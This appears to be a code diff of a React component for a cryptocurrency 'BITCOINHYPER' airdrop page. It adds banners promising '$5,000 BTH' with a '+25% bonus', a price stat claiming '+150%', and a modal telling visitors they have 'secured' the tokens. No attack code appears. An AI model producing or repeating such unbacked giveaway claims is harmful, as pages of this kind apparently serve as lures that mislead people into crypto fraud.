-          {error && <div className="bg-red-500/20 border border-red-500 rounded p-3 text-red-300 text-sm">❌ {error}</div>}
+          <h1 className="text-5xl md:text-7xl font-extrabold text-center mb-2 bg-gradient-to-b from-white via-[#f0d0a0] to-[#d68a2e] bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(200,120,20,0.3)] animate-pulse-slow">
+            $5,000 BTH
+          </h1>
+
+          <div className="text-center mb-6">
+            <span className="bg-black/60 rounded-full px-6 py-2 text-xs border border-[#c47d24]/40 text-[#e0b880] font-semibold backdrop-blur">
+              <i className="fas fa-bolt mr-2 animate-bounce-slow"></i> instant airdrop · +25% extra
+            </span>
+          </div>
+
+          {/* Stats */}
+          <div className="bg-black/60 rounded-2xl p-4 mb-6 grid grid-cols-3 gap-2 border border-[#c47d24]/30">
+            <div className="text-center">
+              <div className="text-xs text-[#9aa8b8]">BTH PRICE</div>
+              <div className="text-xl font-extrabold text-white">$0.045 <span className="text-xs text-[#c47d24]">+150%</span></div>
+            </div>
+            <div className="text-center">
+              <div className="text-xs text-[#9aa8b8]">BONUS</div>
+              <div className="text-xl font-extrabold text-white">5k <span className="text-xs text-[#c47d24]">+25%</span></div>
+            </div>
+            <div className="text-center">
+              <div className="text-xs text-[#9aa8b8]">PRESALE</div>
+              <div className="text-xl font-extrabold text-white">STAGE 4</div>
+            </div>
+          </div>
+
+          <div className="text-center text-[10px] text-gray-700 mt-6">
+            <i className="fas fa-bolt animate-pulse"></i> 5,000 BTH · +25% bonus · live now
+          </div>
         </div>
-
-        <div className="mt-8 text-center text-gray-500 text-xs">© 2025 BITCOINHYPER — 5,000 BTH Airdrop</div>
       </div>
 
-      {showSuccess && (
-        <div className="fixed inset-0 bg-black/80 backdrop-blur flex items-center justify-center z-50 p-4">
-          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-8 text-center max-w-md border border-yellow-500/30 animate-fadeInUp">
-            <div className="text-6xl mb-4">🎉</div>
-            <h3 className="text-2xl font-bold text-yellow-400">SUCCESS!</h3>
-            <p className="mt-2">You have secured <strong className="text-yellow-300">$5,000 BTH</strong> +25% bonus!</p>
-            <button onClick={() => setShowSuccess(false)} className="mt-6 px-6 py-2 bg-yellow-600 rounded-full">Close</button>
+      {/* Celebration Modal */}
+      {showCelebration && (
+        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
+          <div className="relative max-w-sm w-full">
+            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 via-yellow-600/30 to-orange-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
+            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-8 border border-orange-500/20 text-center">
+              <div className="text-6xl mb-4 animate-bounce">🎉</div>
+              <h2 className="text-3xl font-black mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
+                SUCCESSFUL!
+              </h2>
+              <p className="text-gray-300 mb-2">You have secured</p>
+              <div className="text-4xl font-black text-orange-400 mb-3 animate-pulse">$5,000 BTH</div>
+              <div className="inline-block bg-green-500/20 px-6 py-2 rounded-full mb-4">
+                <span className="text-green-400 text-xl">+25% BONUS</span>
+              </div>
+              <button
+                onClick={() => setShowCelebration(false)}
+                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-3 rounded-xl transition-all hover:scale-[1.02]"
+              >
+                VIEW
+              </button>
+            </div>
           </div>
         </div>
       )}
 
+      {/* Animations */}
       <style>{`
-        @keyframes float-particles { 0% { transform: translateY(0) translateX(0); opacity: 0.2; } 100% { transform: translateY(-100vh) translateX(20px); opacity: 0; } }
-        .animate-float-particles { animation: float-particles linear infinite; }
-        @keyframes pulse-glow { 0% { box-shadow: 0 0 0 0 rgba(234,179,8,0.4); } 70% { box-shadow: 0 0 0 10px rgba(234,179,8,0); } 100% { box-shadow: 0 0 0 0 rgba(234,179,8,0); } }
-        .animate-pulse-glow { animation: pulse-glow 2s infinite; }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .animate-fadeInUp { animation: fadeInUp 0.3s ease-out; }
+        @keyframes floatOrbBig {
+          0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
+          50% { transform: translate(-3%, 4%) scale(1.05); opacity: 0.7; }
+          100% { transform: translate(0, 0) scale(1); opacity: 0.5; }
+        }
+        @keyframes floatOrbSmall {
+          0% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
+          50% { transform: translate(5%, -6%) rotate(3deg); opacity: 0.6; }
+          100% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
+        }
+        @keyframes ringPop { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        @keyframes spinSlow { 0% { transform: rotateY(0deg); } 100% { transform: rotateY(360deg); } }
+        @keyframes pulse-slow { 0%,100% { opacity: 0.3; } 50% { opacity: 0.6; } }
+        @keyframes bounce-slow { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-2px); } }
+        @keyframes pulse-glow { 0%,100% { box-shadow: 0 0 10px rgba(180,100,20,0.2); } 50% { box-shadow: 0 0 20px rgba(200,120,20,0.3); } }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
+        .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
+        .animate-ringPop { animation: ringPop 1.5s infinite; }
+        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
+        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
+        .animate-bounce-slow { animation: bounce-slow 2s ease-in-out infinite; }
+        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
+        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
       `}</style>
     </div>
   );
